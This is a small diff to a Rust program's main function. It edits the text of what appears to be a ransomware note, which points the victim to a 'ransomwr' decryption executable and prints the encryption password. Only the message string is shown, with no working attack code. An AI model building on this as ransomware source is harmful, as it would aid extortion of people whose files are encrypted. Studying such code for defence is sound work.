@@ -183,5 +183,5 @@ fn main() {
     [PLACEHOLDER]\n
     or just download the decryption executable from VTJ0cGJ/ransomwr.\n
     the password used for encryption is below.\n
-    password = {}", password)
+    password: = {}", password)
 }
